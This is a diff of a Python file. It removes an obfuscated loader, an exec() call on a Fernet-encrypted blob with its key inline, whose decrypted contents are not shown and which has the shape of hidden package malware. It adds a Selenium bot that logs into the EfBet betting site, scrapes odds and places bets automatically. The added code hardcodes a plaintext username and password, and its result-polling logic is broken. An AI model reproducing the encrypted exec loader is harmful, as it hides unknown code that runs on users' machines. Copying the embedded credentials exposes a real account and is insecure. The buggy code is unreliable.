@@ -1,2 +1,267 @@
-from cryptography.fernet import Fernet as afnaoinsfoainfqoan
-exec(afnaoinsfoainfqoan(b'K331Cm1IB_mgACI5g5OGCrE0khXmIXSvbTriSPFmkxk=').decrypt(b'gAAAAABkyPjv44ezaczjOLnDFCpn9iq_ydxEi23bcec5IH5lPCWjXEKrK2Ypj5fjgkBsU2n8wY1J4O4EMNawaV8i5vUdE3NjqlCaXIH9krV55EvCcDquwmyY-i31TdMaw4cQyKRXh2HJm1xoxuiRI_pGX5Z-EjRarXr1kmUuJBjen6czInGKjEB3xIzBuVscCMNtL7NyDAdQPEkuQLvlk2UnIoS2pOXmMeJZt54czAb97UJmWOBsB_u7ONNGIN_rNHkZsnew3jK4ztLBktP6ijMTytSf72BNjByUPj_Q1X1A3_HjCwmYiukkrtRaZ9yemxrz8sv0IfgmqVtEVXYs5XcO-7bZW9Lzh4dYKBG5rrSfLAmztfA8zTwphYGUZCD3Wrxbf5d5gJsI0OvdFzGpatAVquwG2_vtrU2lXcJgIILHqT4yPv81iUItzVG9rpqhdk0EMNjpk9R_SzCB0k9RjTvg_KM6F9FB7mBVKxyve_nNTwRChQ395CRtWZOYD1AUh2uEHeULb9vUrodYHvV84mrClEt337JV1AJ-rYEjqRxMFWMW60EG66EcsS9nGMB-GPSJaZnKsAVgzOT49DDnyQSn1y1NfiJD01sIkd9MK3LtSq0lnU-TkP4ZE1hGEaZNY35WCkWQRJ7RtaWqbnYuVczhjrfRht4nv_3EGyoZKUv_FK8J1Qzlz4RDkX39otpK3aPTq8MMi0-uz1crP0QcPnWeyv017MZjq6sQhvueEvVHdcRRvLnPYYg8GoIFUCOOadJpYSTABkGeipfrMb1ZBh5tBL1LX2-bjKzpsslNOTOJ4nnVzHQOEINTUsA7cGo9TKkZETGTUVd7iv06QtzXCQ_0e-3NgMwuDzC59A7Y0vT7ydWOH_FBbpsT5mY0r1nP_XQzY45473XkQ33v9cwJbbu-m8Gqbn4e1HwEIUAphRH_UMW_6vNqXuMNAnKMj1zi01sJHpHF2GT6gV25fvEyj6Q6mvthsRwOb3D78rWbKsA5eqhS42VhQwni1B6u1GJds3bW4qbcgZ4GyA7Cu9XRPP65rieypOqnwrJKCCENj0EGR5Xm6bILnJrY7j2PBvg48HRs1VqLIu9WuxEdC9C55VWOixznVkVB3BCtJcHvcYFEzW82GSGmFqAw2RaB1BdLkmNPe5yOr8-qffw1s2g6hsxtATszjMe9MlikIKTUYG60WXFeXDiDn43TfpboWXFXTsz3xXrGDiA_PfuwUd_8DqSWt7KwiGgYcCzJl8_uAY26I1v4UYm1WQVcMr7dUto94ihHIjZHW5HFPO0sIi2NKFeRm7Dfr_osT23IXSNppsQXfEutzANqRmOEu6tZ5cNyBX5VjDyoEKyZzzMwj3GZ8VArpVw6Nq09WkZBpV2zqhIghsbgCFUJNPt_bBcJ8_obXkGqeXMJlRzyhe1L-cCkVnEbSBnp5o8GUzseKCbIf2dx5KYzIIOBkANOr5aLZTH5hYRAKtb-ZW-zIvjnR4b9wLrr8Wzn5It3gOR10tAGP31GrN6fKOCZEgd9WP7ALrIqf4vUn2JIJgPrTt0FR6ApO1xcwXlClCm7b0U99zZWlp-Yrq_g0204htWwnQUlZitonT_4MOttSYXVYGnPvVQfdjXp-p8omyHUFwyImI_6mcofs7dOa1qs8UXSpndsYEBvYgFZhxnAy5J-Z78kPbgmMWbdbq5Pv1B7wihMeWCtZf0C7q4ooIYbznkY69RoZCBZoRLBvo5s81_M_lLUIVnc2UjD40Gh8IcmcA8vGb0lfsTl0QrYnyGePOYUgnu-D8_WYme4xmhR7yVTPF41Z5nFOvDBWrfwpVWSsXFU4bV1pNi3nIPSiaJbHEJGuEK3EzyM4wW0YjR3pJXzWPD6BmGMT-b-9VBixLkGsrx42tAQD_Fu4aick472vaI7Q8EaqiJ8iKnEse5Al3xVOQSVOgxZceKWJC-umLvwSg06CntRLj2esSkhkDswZy6FPB3GFfUkNNTM42G0_tQCvpoo3dotFlFoq_hYhFnH3-XOtdgAeKCD_IuU3XpG6ezEGcF5kJ3hiW8NLJr10lZQs0774X53RH2xoykn5XuCcpNGOXcE6U4lNUEHGQsJCWkC4WR1nAKXBKSW4w16TDtW8wsrNwi5H1u-IymLAEaBKt6yqrb-mr4GUShmsoFP5EVUZH1tDi4i0TzFFiWssY3Suv5HlRHCdvO2xnxrhQpwtpWiSlp_7xGXXehQOQTaYMclMVhXMg_-Hc-ROk3R-FkBQQJA2PAbx64Ub2lyt1U4Ioq6ZvRUHmcYilPadKcWzxtCygrikyjbYfv1VdtrDCGtHr7pePbmx_6srYi8xjhmiS6seVarCFToh3wLn99B0DSqHoa_uY7rWb2TpELDJYfk15WdOBn5DjTwacZvy6mdS_8PSJ5QAwmLsUdyGL-blF1XQg-efnDtpB5tJGUIIsorzRgNvVqZuBfAx2v9_sjQoTTFNKOX24ket1dmus3XzAdQ-0R6sVZA3Sh6khBmhdlUFMkgccuZ3QDgLPGryqnGo0LYhl5KjOQQiIPCdZ6ZIeC8bVHT2KlKmcG2MxeYpc2NEyFufjMNEwTwvizgx6N8fiQZe323OsxlTNHSmv1hOnB70u9_qCeuTXLmIY7of3MaD8mhLvv9sEx6Bt5-8DBLm0l9_joSsJUt50lc0_iGYAmLoI-2NQ569IvQh_uELfRU3xFUAD2VHWnria-pMCLH2pG1IBfOHfNSUpKX2Kl5t2XcRWoJuq35C2roNM1jG5zA04g7FPaw651XwGqVQKeKFM9VOeR4_2gAKKrJuivlhqgehcBtS8aXQ3kC-5Std_X2P9vrMa6DBRbnyHVaAJq_bBvrLhLmdECtrgGTyDFwObIKJJwZIOAiYGin5jRu4ENCHE5XVXGtc7MQIqMU-V7K4XgCdE5xQLtRjBYaDIfdzIkMh8HHYGQbmU-F1pRsLpUXDrOEPW_IetCt5RKgcEjTiwMiskQhQJBTQKNhkXV1mMyM2twSs7FUa6zJlrg-UDgHTVNgwM-5YZ9zW-uSb3dyce5A6ZlwcYMDJ0_pG91i4YWlzcE1N2ieF7EIaZEW6VHvkuy27zWyO-gjdbh-1HcipqvQYLdr-saoUoPKyGCCFGqKqPXKg2jjYnV2KWuaJSE2QCmul0x_L9XnqrTzRdJKxwDK9kTY6kMAn3KJHCKPNu0quI2mqV3e1xxw1qgt9udJy4JrBWV7dgkZIAzrv9Hxe6SZXI24w6k9EVXsm75pXlZgRewR6erQTWIbzQi9KLSav3UN3ovH7uC0Qnu9RdrJX3EJBFp7zPfzVS6hBAHBafDjQsuarUGJZeOFEOUTTRe9eGAhM9PvytuD1YqXKxbzsFC6uwVac7ObrOMQt824JrL4vDT_CpXWOsN2nQubYlnJG7IjSTa5PfFSBTgLlnM95QLRTQmTkKp4j1ccZi2zsxZo8BZwEFCipoxUe3cCoIXSCAO38Q_ZcmNT1oPg9uw3z3EdkC9JvGm3_rdv-G4d4sZEYoFgm-Vvoh6ikCKtvzLMTEGus8vGeGPfbwqzF0un2AwpGGbped7-X7htAWIZ3CIpl6QQmJUwq8w_M4z-rUOYRc3tp5-qg86pwqK9Qw4LJ-QRXVKNoWZ4xE1w0KPG-n6vWOb6dd8ObpFBY0g41SzKu1r59L8e9-Cb89hi6tHHBmA-XBbL0HDPdFLvDRHaJVYJkm92ufebJcGYXcnTUX3p3aFq_8BO0oMciM1Ecw5KRkhqgiXaMTRU3xP3c-Xu4TG7-hpHzsBS91s-_JTvj0XEPQ-RDuta-rKOwArp-YnqTLCY2NjotDVWc_4ddktQn5mjWrcCZLVNcSaKEqr6F5XKpMi9BMKBcoTbJhzvpNvDd8o3Y1NcVtODifyPuZ13uiIVinWZfrbm2bspfgHZHHrxvwWJ_UA-818lrD2Z1ggGxqcHAcs556CglfKcOQn2F2q9c9Fl-nus8o0uk8Nau54_L0wqhLTKqu4twbgnmNkoQiX_59L0E7xr0yyDQvKanJ9IOVoDnTL9QyzEi0_tViCYyf-0k6znwPUoMPP8pRvVt8e7tcnqBuAMjyURhH2xgJ1wukttZ3qjQUVkhVi21cv0n6LbR5MRHTZS3qo6m2JBQyy1_wb0dSrXa2kEZTLJHVrJosZpAjjPxUus8betvCrKk04d-xe6gzhwIISIO82q3I-KBeseBlcM2bg9BQSed0jZ9tDxi3yP6mRPlgNsHPrFsGKgU59LWftmbwdDfNznFUzojeBJs3EIN2LaQVrnQUq_AQERbUxVh5LLtoQ0Tf9bObm-_IbwzFZ7amuPdNYppJdZ4JnhIU8KctFNS_bv7BvLMKikCWfx8ped6UeugEVseTlsQHdTrz2OG_t-95kLxQ_hnt7h04wjWmbp1Yc4AfIz2Ekl9mzdROj-doR_xjyd_R5sF9t0G-iNm_wAoTKNThWI-KP50VpOPG0FYzA-VteQcU5Vm5beBQSuSceBoImper5lbuYh8z2mynmtXWUzDo6NBIKaF-UejcNM8Mg8SOih1QxD6lD9Rkdz4X1TyZDbAF6CS3PR-jJmXUkSfS1A7wiDkVA6qLy8Z4ZY5HhIHyzqZvv3l1sCnsUWB_wCUS9TRsVm0UwrBVzGjbIIxh6xjK9EZcXhRO6oQcGiDK3YgwItiSf8X3JgTKbqXka5wlMgg3ZSyQb7AKyl_pwnYA-9JOS5-3fex__zgt57Z2iGxpH-8dHgMRQmw5Cr3m-eBVgK3cdMXEFDqFYHkFayWtfYTVaYQK5br1rYncBc4MoKZBvSWabm355WiNKluham0XHDZhKnI1XAmQov3zf_UkiXrCnPSh0Xc-gwbFwwlS9brdavMiHiVNillo2KWskXkJAqX8FU0-9idQRhCkJhgoAs8HLl6m1Pr5WkCTyhkLpTzqCE-s59Tvv2fPfv0VKkX5wv-tNR17UsHDFwqWgKcR47i-T4AfHa_nBu5cOl36GMxyGCZl-tJMwXEs_TscyXQJLtNzCfeWMlW7AhZfKDAHl6pRpXOoE90hTbxvouaAp82Vs8hQVp6GYuN1tGPaWBkZ_VZKjyVVWx5fXqhaG0C_NUwqveyUrAcN6GrjuFWCSYUMhOI8U1tzmuKydC9U-nkH4wXi-2cToS5qDXePRIfkytrVy-5UFEx-kj_y3g8WSgvA3O_tWEStigN9EUd9CLee8K1DmTv86D6U5NdT0O3LZxXs_erIb6XJkyG3Zi93P7n44n5KNckJxgarQltUNP3uvXkdm6GxowB2x19CExHVENXNAtl_MnoId_wKiO91_Cjb2XeYULkCWBvEUuXc1lUaSJgWy1t2huHlfPukZNUN1uxDiEqxy0vHUIjwCaGcu9SpT270D8mLg5R_02Wib6mowu1MKFFQEOdDXytGxWMpNXdxO55LcVX4K4UDrZ4AO3HCZolOYXHN065OCnLZyI9ay3XnYnnH_-2HfPIEfR556r9BPRhzOlASuJPZEXQj6vIsFiWkI2FOkodJpUDgMG4ViRulk1R0ucQ5IlFgnl5E_JCKsroyfh5EMnez5jmG030nm9RwoB1WleVD7Ofje_3iLPg80bz_31TE1TjnrFl-myfzWQJTXnpJdySnRqmA3VdcI1GoabEzd0EfEMi5vY7CwzkkmDRA0Jji28TWbGoSc6DBN1yixIbumTsWts5Mgq0Byq1-X4q5yXMZx8XjmGB-2XaRNQZDkiSzXjOpf_vJ_hV0pZfC5exn7mQKm8ZYQq1zRfIKCGbOX4yDyJel2X6PpwLuS6KgmkzGc9yXtybfjf0HdZTS3j1pzidKzjVrR3ET3FPN9hvcMwj0DzbtKFmDr6hllQ2RqDaIaVBnJwYPGq8tE0KdK9GZm4jaKxZVMKe4hxKVkdi-ZdOQcWNCt6dUUC5nJfW83EOjKuoMM9pvPfRNjiYF9voxZJJSyvJrmfMYp7LSU1_Zd8nW-Dm1KSHJCq5jh28K4VSrMECUIpYRSFajlI8CE-bdutmGtfDvgUiUfk8AOc2d6EXGUPxoMqf2qlmcqv_n0WIVu35snrn0gkoXX_hjAjOLDBBZH5CjkhiQzD1h1KZQ-urHMcH4f1XkPvbQKyDL33RKEw7GDZleBpK3NoWyMtj0xF5l9K642_UjdoKBffd60TgFpLNAoDTfjERbqybxDCuGmL1ouocpfwKRqPH777rnvVJis9GlUDoM8S8S_h1zI80wV_qSh7Ba-wprjNAXcYFTG2MOLqJHN0ZmiOcAhLYxIlDW_wFpTEp-Qxu7d6-2hWN2Ls7xXDr9w7-kTN_Nj7dqrwc7NXm6Iz8j-XyDkm9ZMy7JnMhwAk1qQWBSyk_guTmc8fFlLfpru-ODmK6JIcHdzxMYFWZB97D5XgPTdbAP8gWpT9-U-zGi3U9U5Cg7nffxoqGYjFvhoDhwlYDtSGqbWTO2ODaP7QWI6KpFZySrz-rvoPvMM-HkC6DGY47lZH5JDE_c0CaVMW8xf8SuzPk4gO8hgXoCnXuedXxJ6YP6VVTtP4rDnNLk013V9PIj9jvb7qDVL4dl1Lqrg0_RI9tXluhyWtrR_7dcnqYT-4WHfGXIvpJWx9L-dsxGe2V0X_jFuWtsEyBTo1cgr-TRVfEQ2XrbLUiMF20YWC0sUKpSvc4M4ZercfT-B39uwdGfJBqnCC63cbSVCLd8VG_EdaL1G00-VmGgHb3NgdK04IPlDR-fAg5B_1vya0B_mfzzEZsHwdEItPXDKmZeop4AVhJRGpUgV4x7EN5xUD7dJX6Eq7-WhhEkzzZHTFnu4DZUEzFEu22RLa3uMtqwmEm3wgNz_8B5_98mxjq_ZqK3mMA1LrTwtpCehR-DuzyfL3C1yRmaoh2larGERiV3A-CYfJLLz5h7a65CMuKzmsX2rNo4hIqDb-qoq5cQVIwIlcWbkLu10Zwu53mE53KYRaAo2g3i3RsXFaARY7LYiG-GWEDmOSYQsB3VU5UeEDHZUE6b9uTjTq-7U9L6E4IvbMUb9jH-pfNYqcpHx7GvpZ2BHUnKz5TnSRN7Y7I59MLRfxxhHJoB51m7JmYLbg-gjCAILp1K3dtgLzsnM2flDE6MwYhkxfa5I0-KAO6k3T0Cnjs0tPyt8uMTLnFgIv6U0ZG9H7END9_6r1LUf8ft4zoTkOySXak-1ePoNkQz-7b7zRW-Y4KzmEVtceK9vKpdsvZHGs6OSKvxVRI9ImcfxCFYVBQvjVfENQgcMbId3P99WEo6ac_SmJb-XwDWjBzcYhvfquRBevZOdrNapYs5xT2TtHJ0nmXJNN2nvwTCdEJcc3SqupiA_783s9pHp9H9LNTLjUAcAbAT_X9ATHumqel-rJgEHk3h7AaKwzemtGirWthLExW-V-KBJfYJy2d3xMABCPE3PJV4ize7ixvZAb-PRIawrCbCBChjAHz6DaDNGfcRt-AeTl8mmPfIqlCWlA382Ta4rqwBnGHz5IaD_cxn1RySOwE3QutWuF95a61t4WPpJuWfLQejvzxd07sCbJomb7eYbs1R-IhrKbnISajC9drhHI_7uLMJVeR8C3KLqs5Y2qWQi2XC_WESr-ToVaWdguzwBD_qrWWXjVQhK59IkCfP30bbQTgcrA1qTWFZ94stS2uk_ddGOlwX1hlfTplZm4Pjrwmv1sJtJsEE6LeksnKcpbkC-XBt-SNuJgvjH1IidUj5Lqag9B4WkbyYuPRTBei664TYpReqfROFrrXLujyqFQPgg2ZXtHHtF8jX3LHlsf3F372AIvge7rAKZd9j438SngV_eAEtg6PxgxyffscBRm1aGT1wfK2vspwZUZK-LeK1oMhotiYwuR4x9HoxBzqXKW__varaR5viwfdd0O0I0DkWp_dHHJJjoAhkLuaOevj6mxXJgaE9kAkbn3wPL3gkCw8OMVMYOhrYkW8LJefDdgV7h__zRtxjGZmoclkSC7U5Iz7BjD8xYoQuucMwub9TsVGDnk3Rcrk49tBC_dyiAja4IR3ntLHBXM9yK5_EZ1eG3oP4J-pE6E2LUEhpel4w4SkJhSV6JywF5Q_pTY6bu68jnRHEe4kFhq8JZwF5gNHn50umIZWJTovdwPGoYJ4VjPHe-Nhl-BBTQO8hcLYsOpYQXjngls6aeMYX9rvcZuTiU3e6PQn0P8IY8-i73ciwFykukmo5R5YDGnzb7dHYFRFmOBmldNXv7UmXnExRljcqc4x7ooRCbkIceKM2a0JVS4hYe8Us_pjRaYFugFAL5PWrUlt5bewub0h8w5Cbw5dfC6uzYGfLVStqG7w_iYazsToXhLfmgVMAe_1gA8Er94BJxLVyOfJ0W9Y9lHTWl0lRfNi3IhtxEN1mfeLesG0zl6JPlDAUn1uJ5X2E0t0ksCUa1e2SSjB_JdOKE4Bqwk3SL6YDAqdcMem7B6BxcQdI6Fz-fYgu4R8WCREQU5L_UQD6rh0n5LEtGm9m57Pkg_3W4O0BX59tSwz-HZIWaTBYQKnkCElPGqkBIqXcsGeYKUskSneh42sJLI_BgzjrqO09Jv5joS_VhM01vjijFo_joo0JWvWljbM9-7SFDz9sLbp_1GASXw3810jisKLKMgeFlnonwI89WTUDqPU93AUqvg33kFrsWEn2ryEG8pa_wMS_V3J8PIoAtSROuGc9rXhGw9n6OU_Ul_shvMaV3b0zyKBB2DrwXD3uyxXl3Er07-CvU62-oLSyrcL_DZJ5qtC3feqlRZ7DW4t2T8lo_1q0zacqPr2CCS34yo51Pz12oswAmYMPo8VS9R7vqzNjHqjp5w3UVazhh4RNcrJI-HSvp4pw8kFuVdezsrATOtPUd9F3CR40vhVwDWguWuwF004H8kJ822-jMHycdwFM-OkvL02IYEteTHMF8pF-4fcXYS5AEFL09bqCKXcfbXoND9JICIclqKt_vCGtHWICCkluSxM2UYoISEUu54zdh73wSxEt78G-qLViF1MC1TWw-i0rKx3MP0dH6hrZIlI9QZxOTXcV-exqLNxniOpJ1S3qzV8HpHUEbiitYS0u0dbFaU8tWMQBOwcuQaNhCkWgbLW1cCh6PRDI8j_vGyRjc8bbSELFKwTK9ja0_zt0NlULxJbpiruF3A0pAURJm5bXyp3rLYgLoCpdRbKhddQEgHhHeEuF7eomJ-je9UPegkumVyiMgmTO42evLieS3vnCKUrMO2NFW_NmYyS7vyxMAuIpSqDC9KKDPT18LmM2OuzlqiyNNW3FfWBthwmWOPn8aUl4J9Xa-TZWAKKq7FKHPiqRJWF1DGio1Aow72oLcosLOMZNkoZoVQMET-EFJrAATtSRIbUZh92CKay-kZ0iqihZJvDfC6X-z-qm4FE5mKSQeXhlHXoCt5IGBT_NkvNVITK7vPbuB1r7ZJ0QVX8GlyuSoxTJ3jhOAp40L9QyCu-zw2WprqCgjQnQ--D4pOqKFHsO_fjVr3qVwdk9L4r6rkQFycQT-tXTDMAofZ7zJTbSBqCvy-LAHqqAWhacGbRWlxf9blnSO4RW70NR8L4jxfjPzLotiFRr0RPYTSoIWxVnthmgGMliHEq3kMEc9TUyxslxqWDHZuNNSEtWpQXk1lJddHwaiannFMbX6UDTphXvkTR-MniI8NubtLyqtZskYlVO5GFhR7FCSEfke117I8IMbS2mKzQkoWwhQWqfKscZe7BYy-L85PBQWqlkMQDUUXnFDhraEhCsXYzliBGeZAodv7qxBO8iUF8xxr_uZtAPG_WAwbOkWgAznrGbt-2y5kiQIr07iyenS8zaadfDnVPP-BQocUbLie-lF9dG4otWYnU5TZCTJ536WARD1rGYQIHM7iLbt6u8Fk-l2PeJo89Z1FXYAHquTcNM7z57l93CtPP2G5IiFlApPERUKDUJte1Ijy5ecojr7bAjxGbQM2spumEjB37CvLkdw2ZmtFqgLXZ3nOksVjIPN8UMnXdhx3WXsVgV6PxztOVbK0RCnymVi7LkX8owT_ojkL0guh2_PxV-OTH3Qwm5ulrHjD7CF_L4iuqgtw-AFXxFsr6NN0Qi5ujghOrCnhp3h71-_5y6yFJ5lBPiBzyN0WrN-VxKE--1VHVLa47kqNBG_siNmfutqwxHpJFAeuNTU3q5maKzYujdBh0gXlydq1JiFQpd0TehycMXD-FS854RNzjp1dES8TgEGysTCOMzjPOFJUQN0jgu5TYEVDayWXkiGA5akni22gA2u4Y50hu4izZVu9dtKxp245nF0vXqG-Du7UVikf5E4_O1QoLO35m3aeQnVL1zlWHXBkeySAqpzNmcKQS16clpTEjMxOYOXvbGTtZNjlyCrmVCt6cCxooIi0cNIpS4IThBHf5lSR8ycry7G8tzR3pNqHqIZbBwdTOEb-JSdqw_dhQBBw2Lotc4cFKjOOeSpfiWrk5tSvR9C4mysxUeQgLiNC8eYCyatZEvB4Inc4d1lj9T4MOE7BTVhK2DxKFwfKTpmKk0MO6sTKD4zvfLSWBOR2GSF9sTWQMdjXABt3PTNBu9NSd7KMMrkkorP50PgGp_saPmhRmsHaDu_SPHQRQJQHhs2KZBvgqauSC2ZI3Q6H7wSLwQZtft4jQyhQwjorZlu8Te-7bvfzdopeAqS8utqdEknw7-CC0F72vPqDOY4rZbDRp04uRBi2Pw0JHpiTLmFq2wjTQFHD0ge1M-6ZAXZTClV87sR8vWXcu9YhU1-UTKKDFU3W1KBtdhS560H85NlkfCam96j4dCaUVotJo5nqYRTLt6ePnl7vSRknHLccbdfdEIgLOMcz2A7f7OgWjUG0KJ7H_33jZLbW9EXgDph20kj8yeBEkluobQL-Spl8T9NOHvqa2tM8q59OfDg3MOQMxn8nGiDKaIuLo3jgo2nEk1nHB6FzM2jaJJerIP7FqyUA5jMbHVEqwL_Xzwnm3HqmZwb6uaeI9z06lt_qdKdGLr2cF-TMvoweBx3-B5Y2ZJr2AqrWpVb1R_u9FEBcaasn7HFhqTtZ5EEHDDv-mSGfMu39k0a436AH2DqMDWNj40MNlBPPoBO5oNpmR1fQ-lz1d5N3AuBIOchxz1WTH6vA5fCirYu5jZo0HofvtqF-96gTx1SMMxSaDNr4f8PrDsZ--L2iRStEG7NuUWhbN_vX2kjp7LI0oWD2Z7fspzsMD15F5tvFgmBd7PJVw1Ras5bVnSKHT5d98NA2lDJ5ev_atM8PDSgwvBlIq1J5tJDrYxI5uEPxjjoJj9Qk51SC4lqYk7THs0mDmUG_D-7-BZeqxiFT2CVR1BZq1q-PDUN2p3LJQbVQQEg0lGjBsQ__SU3WgbYPTcG3CQ0UEYUmmXbg0XT8cBihi-e4fvMiB_2gtX0eE79tQF2tCHGgUS2__Q2fxM6J7_0gzGprUabG_-rLjvUI3QE=').decode("utf-8"))
+import datetime
+from math import e
+import requests
+from undetected_chromedriver import Chrome
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import time
+import logging
+
+logger = logging.getLogger("mainlog")
+
+def fix_date(date):
+    if len(str(date)) == 1:
+        return "0"+ str(date)
+    return str(date)
+
+class EfBet():
+    def __init__(self, username, password) -> None:
+        self.s = requests.Session()
+        self.username = username
+        self.password = password
+
+
+        self.init_browser()
+        logger.debug("[EfBet] Init session")
+    
+    def init_browser(self):
+        options = Options()
+        options.page_load_strategy = 'eager'
+        self.browser = Chrome(options=options)
+        self.browser.maximize_window()
+
+    def save_html_log(self):
+        with open(f"logs/html_{datetime.datetime.now().strftime('%d%m%Y_%H%M%S_%f')}.log", "w", encoding="utf-8") as f:
+            f.write(self.browser.page_source)
+
+    def login(self, n=0):
+        if n == 2:
+            logger.error("[EfBet] Can't login")
+            return False
+
+        self.browser.get("https://www.efbet.it/scommesse")
+        
+        WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.ID, "cg-username"))).send_keys(self.username)
+        WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.ID, "cg-password"))).send_keys(self.password)
+        self.browser.execute_script("cg_login()")
+        try:
+            WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.ID, "cg-profile-popup-toggle")))
+        except:
+            logger.debug("[EfBet] Failed to login, retry")
+            self.login(n+1)
+            return False
+
+        logger.info("[EfBet] Logged in")
+        return True
+        
+    
+    def search_match(self, match):
+        logger.debug(f"[EfBet] Searching for match {match}")
+
+        if not self.login():
+            return False
+
+        time.sleep(2)
+        try:
+            el = WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.ID, "match-search-input")))
+            self.browser.execute_script("document.getElementById(\"match-search-input\").readOnly = false")
+
+            try:
+                el.click()
+            except:
+                self.browser.get("https://www.efbet.it/scommesse")
+            time.sleep(2)
+            el.send_keys(match)
+            time.sleep(4)
+            results = WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.ID, "autocomplete-search-results-id-1"))).find_elements(By.CLASS_NAME, "pointer")
+            if len(results) != 1:
+                logger.error(f"[EfBet] Match not found")
+                return False
+            
+            results[0].click()
+            WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.CLASS_NAME, "blocco-quote-espanse")))
+            logger.info(f"[EfBet] Match found")
+            return self.scrape_quotes()
+        except Exception as e:
+            logger.error(f"[EfBet] Couldn't search the match")
+            logger.debug(f"[EfBet] Error: {e}")
+            return False
+    
+    def scrape_quote_type(self, names, selector):
+        quotes_dict = {}
+        try:
+            el = WebDriverWait(self.browser, 2).until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
+            quotes = el.find_elements(By.TAG_NAME, "div")
+
+            for n, quote in enumerate(quotes):
+                el = quote.find_elements(By.TAG_NAME, "span")[1]
+                quotes_dict[names[n]] = {"element": el, "quota": el.text}
+        
+            return quotes_dict
+        except:
+            logger.debug(f"[EfBet] Can't find {', '.join(names)}")
+            return {}
+
+    def scrape_quotes(self):
+        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.ID, "secondo-blocco-sport")))
+        self.browser.execute_script('document.querySelector("#secondo-blocco-sport div[data-id=m--1]").click()')
+
+        quotes_dict = {}
+        quotes_dict.update(self.scrape_quote_type(["1", "X", "2"], 'div[id$="_3_0"]'))
+        quotes_dict.update(self.scrape_quote_type(["U 0.5", "O 0.5"], 'div[id$="_7989_50"]'))
+
+        quotes_dict.update(self.scrape_quote_type(["U 1.5", "O 1.5"], 'div[id$="_7989_150"]'))
+
+        quotes_dict.update(self.scrape_quote_type(["U 2.5", "O 2.5"], 'div[id$="_7989_250"]'))
+
+        quotes_dict.update(self.scrape_quote_type(["1 1T", "X 1T", "2 1T"], 'div[id$="_14_0"]'))
+
+        quotes_dict.update(self.scrape_quote_type(["U 0.5 1T", "O 0.5 1T"], 'div[id$="9942_65541"]'))
+
+
+        quote_str = []
+        for name, value in quotes_dict.items():
+            quote_str.append(f"{name}: {value['quota']}")
+
+        quote_str = ", ".join(quote_str)
+
+        logger.debug(f"[EfBet] Scraped quotes {quote_str}")
+
+        return quotes_dict
+    
+    def close_browser(self):
+        self.browser.quit()
+
+    def place_bet(self, quotes, bet, amount, bs):
+        try:
+            logger.info(f"[EfBet] Placing bet quota: {quotes[bet]['quota']}, bet: {bet}, amount: {amount}")
+            quotes[bet]["element"].click()
+
+            el = WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "[id^=input-calc-for-bet-event-coupon-]")))
+            el.clear()
+            el.send_keys(str(amount))
+
+            WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, "bottone.bg-verde.bianco.maiuscolo"))).click()
+            try:
+                WebDriverWait(self.browser, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, "bottone.bg-blu.bianco.maiuscolo"))).click()
+            except:
+
+                #QUOTA VARIATA
+                try:
+                    el = WebDriverWait(self.browser, 3).until(EC.visibility_of_element_located((By.CLASS_NAME, "bottoni-quota-variata")))
+                    time.sleep(2)
+                    el.find_element(By.CLASS_NAME, "bottone.bg-verde.bianco.maiuscolo").click()
+                    el = self.browser.find_element(By.CLASS_NAME, "scommessa__esito")
+                    quotes[bet]["quota"] = el.find_elements(By.CLASS_NAME, "scommessa__esito__valoreQuota")[1].text
+                    bs.go_previous()
+                    bs.update_masaniello_quote(quotes[bet]["quota"])
+                    logger.debug(f"[EfBet] Quote changed to {quotes[bet]['quota']}")
+                    
+                except Exception as e:
+                    self.save_html_log()
+                    logger.error(f"[EfBet] Can't place the bet")
+                    logger.debug(f"[EfBet] Error: {e}")
+                    return False
+
+            if not self.check_bet():
+                self.save_html_log()
+                logger.error("[EfBet] The bet didn't get placed")
+                return False
+
+            return quotes[bet]["quota"]
+        except Exception as e:
+            logger.error(f"[EfBet] Couldn't place the bet")
+            logger.debug(f"[EfBet] Error: {e}")
+            return False
+
+
+    def get_bets(self):
+        now = datetime.datetime.now()
+        before = now - datetime.timedelta(days = 7)
+        dateFrom = fix_date(before.year) + fix_date(before.month) + fix_date(before.day)
+        dateTo = fix_date(now.year) + fix_date(now.month) + fix_date(now.day)
+
+        payload = {
+            "systemCode": "EFBET",
+            "lingua": "IT",
+            "hash": "",
+            "token": self.get_token(),
+            "accountIds": "11665;0",
+            "dateFrom": dateFrom,
+            "dateTo": dateTo
+        }
+
+        r = requests.post("https://www.efbet.it/XSportDatastore/getMyBets", data=payload)
+        return r.json()
+
+    def check_bet(self):
+        if len(self.get_bets()["opns"]) == 0:
+            return False
+        return True
+
+    def get_token(self):
+        payload = {
+            "username": "npsassari",
+            "password": "Forzainter1$",
+            "systemCode": "EFBET",
+            "language": "it",
+            "migliaia": ".",
+            "decimali": ",",
+            "timezoneOffset": 0,
+            "hash": ""
+        }
+        r = requests.post("https://www.efbet.it/loginContogioco", data=payload)
+        token = r.json()["sessionToken"]
+        logger.debug(f"[EfBet] Session token {token}")
+        return token
+
+    def wait_bet_to_end(self):
+        logger.info(f"[EfBet] Waiting for the bet to end")
+        time.sleep(90 * 60)
+
+        MINUTES = 5
+
+        while True:
+            data = self.check_bet()
+            opens = data["opns"]
+            if len(opens) == 0:
+                res = 1
+                if data["ends"][0]["st"] == "losing":
+                    res = 0
+
+                logger.info(f"[EfBet] Bet finished with result {res}, {data['ends'][0]['st']}")
+                return res
+
+            logger.debug(f"[EfBet] Bet checked, not finished yet")
+            time.sleep(MINUTES * 60)
+        
+if __name__ == "__main__":
+    import logging.handlers
+
+    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
+    logger.setLevel(logging.DEBUG)
+
+    stream_handler = logging.StreamHandler()
+    stream_handler.setLevel(logging.INFO)
+    stream_handler.setFormatter(formatter)
+
+    logFilePath = "logs/app.log"
+    file_handler = logging.handlers.TimedRotatingFileHandler(filename=logFilePath, when='midnight', backupCount=30)
+    file_handler.setFormatter(formatter)
